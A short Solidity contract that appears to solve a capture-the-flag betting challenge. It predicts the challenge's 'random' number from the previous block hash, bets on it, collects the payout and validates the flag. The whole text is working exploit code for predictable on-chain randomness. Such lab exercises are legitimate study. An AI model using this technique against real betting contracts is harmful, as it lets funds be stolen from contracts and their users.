

contract GuessNumberCaller {
    
    BetFactory betFactory;
    
    function createBet(address factory_address) public payable {
        betFactory = BetFactory(factory_address);
        betFactory.create{value:0.5 ether}();
    }
    
    function callNewNumberChallenge(address instance_address, uint seed) public payable {
        uint result = seed ^ uint(blockhash(block.number - 1));
        Bet bet = Bet(instance_address);
        bet.bet{value:0.1 ether}(result);
    }

    fallback () external payable {} // Get the money back
    
    function validateFlag(uint token) public {
        betFactory.validate(token);
    }
    
}
